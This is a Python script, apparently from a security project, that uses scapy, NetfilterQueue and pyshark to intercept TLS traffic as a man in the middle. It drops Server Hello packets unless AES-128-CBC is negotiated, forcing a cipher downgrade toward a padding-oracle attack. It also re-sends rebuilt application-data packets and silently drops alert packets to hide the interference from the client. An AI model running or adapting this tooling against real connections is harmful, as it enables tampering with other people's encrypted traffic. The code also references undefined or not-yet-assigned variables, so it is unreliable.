from scapy.all import *
import scapy.all as scapy
from netfilterqueue import NetfilterQueue
from scapy.layers.inet import IP
from scapy.layers.tls.record import TLS, TLSApplicationData, TLSAlert
#from scapy_ssl_tls.ssl_tls import TLS, TLSClientHello, TLSServerHello  # Import TLS layers
import pyshark
import io
import tempfile
import os

load_layer ('tls') #loading the scapy tls layer



# Define the callback function to process each packet
'''
This function looks at each packet in the queue that iptables is grabbing and decides on if it should be dropped or not
The first critia is if the packet is a TLS Server Hello handshake packet and if the cipher is not AES 128 CBC the packet gets dropped
if it does have the cipher AES 128 CBC it's accepted other TLS handshake packets are ignored. What this does is prevents TLS connections
from forming if the cipher is not AES 128 CBC which we want as thats the cipher vulnerable to the Padding oracle attack.

Next the function checks for TLS application data packets and shows how you would modify it to start the padding oracle attack
The filter also grabs TLS Encyption Alert packets as this is needed to tell if the modification caused a padding error or a 
MAC error.

To see the padding attack implementing check out the other code in PaddingOracle folder. It's not implemented here as new SSL libraries
encypt their alert packets and bundle both the padding and MAC error together to midigate this attack, so you have to do a timing attack
on the packet keeping track of the repsonse times to guess what the error was. 

This function uses pyshark and scapy, it uses both as scapy lets you modify packets but doesn't show tls infomation very well so I'm using
pyshark to inspect the tls layer.
'''
def process_packet(pkt):
    # Convert the packet to a Scapy packet
    scapy_pkt = IP(pkt.get_payload()) #Converting nfqueue packet to scapy packet

    #Here we're creating a temp pcap file and writing our scapy packet to it so we can read it out into a pyshark packet
    with tempfile.NamedTemporaryFile(delete=False, suffix='.pcap') as pcap_file:
        # Create a temporary file to hold the packet in PCAP format
        pcap_file_name = pcap_file.name
        
        # Write the packet to the file
        scapy.wrpcap(pcap_file_name, [scapy_pkt])

        print("Saving packet to {0}".format(pcap_file_name))

    packetstatus = False #Variable used to check if we're drop or accepted the packet already

    cap = pyshark.FileCapture(pcap_file_name) #Reading out the packet in pyshark

    for packet in cap:
        #Checking to see if the packet is a TLS packet and then printing out some information
        if 'TLS' in packet:
            print("Packet number: {0}".format(packet.number))
            print("Timestamp: {0}".format(packet.sniff_time))
            print("Source IP: {0}".format(packet.ip.src))
            print("Destination IP: {0}".format(packet.ip.dst))
            print("Protocol: {0}".format(packet.transport_layer))
            
            #Content type 22 is tls handshake so we here looking for Server Hello handshake packets
            if packet.tls.record_content_type == "22":
                print("HandShake Packet")
                print("TLS Handshake Type {0}".format(packet.tls.handshake))
                print("TLS cipher suite {0}".format(tls_data.get('tls.handshake.ciphersuites')))
                #If the packet is a server hello packet we inspect more
                if "Server Hello" in packet.tls.handshake:
                    if "0x002f" in str(packet):#This is the code for AES 128 CBC cipher
                        print("Server hello is using AES 128 CBC for it's CIPHER allowing this handshake")
                        pkt.accept()
                        packetstatus = True
                    else:
                        print("Incorrect Server hello cipher and version DROPPING this PACKET")
                        pkt.drop() #Droping the packet if the cipher is not AES 128 CBC
                        packetstatus = True
        print("-" * 50)

    # You can also inspect deeper details of the packet layers if needed:
        if 'TLS' in packet:
            #Content type 23 is application data so this will have the encypted message
            if packet.tls.record_content_type == "23":

                packetS = IP(pkt.get_payload()) #This is were scapy doesn't handle TLS well we get the IP layer of the packet and get the tls info from it's payload we also need this packet to create a new one

                payload = IP_scapy_pkt[Raw].load #Getting the TLS layer in bytes
                print("Payload")
                print(payload.hex()) #Printing out TLS packet this will include headers and the TCP layer
                payloadArray = bytearray(payload) 
                #payloadArray[-1] = 0x00 #Here you can change a specific byte this is where you'd loop through each byte to find the correct byte for the attack
                payload = bytes(payloadArray[52:]) #This is taking off the TCP header information
                print(payload.hex())
                print("-" * 50)
                #Creating a new packet with the same TCP and IP headers but with the new and modified TLS packet layer payload
                new_packet = IP(dst=packetS[IP].dst, src=packetS[IP].src) / \
                             TCP(dport=packetS[TCP].dport,sport=packetS[TCP].sport, flags="A", seq=packetS[TCP].seq, ack=packetS[TCP].ack) / \
                             payload
                new_packet = new_packet.__class__(bytes(new_packet)) #This recalculates and missing fields in the packe
                
                send(new_packet) #Send our modified packet
                print("sent modifid packet")
#               pkt.drop() # Here we can drop the original packet so only our packet gets through 
                packetstatus = True
                #Note in this example the packet is not modified but shows how you can modify the packet to prefom the attacl


    #Here we're looking for packet that are TLS Alert packets Scapy for some reason doesn't see them as TLS so we need to look at every packet and look at the headers
    IP_scapy_pkt = IP(pkt.get_payload())
    if IP_scapy_pkt.haslayer(Raw):
        #IF the first byte of the packet payload is 0x15 or 21 which is the content type for Encypted Alert we have the packet we're looking for, 
        if 0x15 == bytearray(IP_scapy_pkt[Raw].load)[0]:
            #Printing out the alert here we'd need to time the response from when the modified packet was sent to tell what type of alert is was
            TLSdataClass = TLSAlert(pkt.get_payload())
            print("TLSAlert class")

            print(TLSdataClass.show())


            packet = IP(pkt.get_payload())
            #Dropping the packet so the client doesn't know anything bad is happening
            pkt.drop()
            print("This is the error alert PACKET. We want to look for this Packet for when get error response back from the server")
            packetstatus = True 

    # Check if the packet has an IP layer
    #This is just printing out the packet info so we can note that a packet was seen
    if IP_scapy_pkt.haslayer(IP):
        ip_src = IP_scapy_pkt[IP].src
        ip_dst = IP_scapy_pkt[IP].dst
        print("Inspecting packet from {0} to {1}".format(ip_src, ip_dst))
    if not packetstatus:
        pkt.accept()

    cap.close()
# Set up NetfilterQueue and bind to queue number 0
nfqueue = NetfilterQueue()
nfqueue.bind(0, process_packet)

try:
    print("Starting NFQUEUE capture... Press Ctrl+C to stop.")
    nfqueue.run()  # Start capturing and processing packets
except KeyboardInterrupt:
    print("Exiting... Stopping NFQUEUE.")
    nfqueue.unbind()
